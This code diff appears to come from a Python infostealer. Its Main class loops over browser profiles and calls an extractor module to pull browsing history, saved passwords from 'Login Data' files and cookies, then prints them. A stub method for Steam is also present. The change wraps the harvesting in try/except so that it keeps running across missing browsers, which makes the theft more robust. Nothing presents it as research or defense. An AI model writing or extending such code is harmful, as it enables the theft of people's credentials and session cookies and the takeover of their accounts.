@@ -19,33 +19,36 @@ class Main:
     def browser(self):
         for browser in extractor.browsers_profile:
 
-            if not os.path.exists(browser):
-                break;
-
             profiles = ["Default"]
 
-            for folder in os.listdir(browser):
-                if folder.startswith("profile".lower):
-                    profiles.append(folder)
+            try:
+            
+                for folder in os.listdir(browser):
+                    if folder.startswith("profile".lower):
+                        profiles.append(folder)
 
-            for profile in profiles:
-                browserExtractor = extractor.Extract(browser+"\\Local State")
-                history = browserExtractor.extractHistory(browser+f"\\{profile}\\History")
-                passwd = browserExtractor.extractPasswd(browser+f"\\{profile}\\Login Data")
-                cookies = browserExtractor.extractCookies(browser+f"\\{profile}")
+                for profile in profiles:
+                    browserExtractor = extractor.Extract(browser+"\\Local State")
+                    history = browserExtractor.extractHistory(browser+f"\\{profile}\\History")
+                    passwd = browserExtractor.extractPasswd(browser+f"\\{profile}\\Login Data")
+                    cookies = browserExtractor.extractCookies(browser+f"\\{profile}")
+            
+            except FileNotFoundError:
+                pass
 
         for browser in extractor.browsers:
-            if not os.path.exists(browser):
-                break;
+            try:
 
-            browserExtractor = extractor.Extract(browser+"\\Local State")
-            history = browserExtractor.extractHistory(browser+"\\History")
-            passwd = browserExtractor.extractPasswd(browser+"\\Login Data")
-            cookies = browserExtractor.extractCookies(browser)
+                browserExtractor = extractor.Extract(browser+"\\Local State")
+                history = browserExtractor.extractHistory(browser+"\\History")
+                passwd = browserExtractor.extractPasswd(browser+"\\Login Data")
+                cookies = browserExtractor.extractCookies(browser)
 
-            print(history)
-            print(passwd)
-            print(cookies)
+                print(history)
+                print(passwd)
+                print(cookies)
+            except FileNotFoundError:
+                pass
 
     def steam(self):
         pass
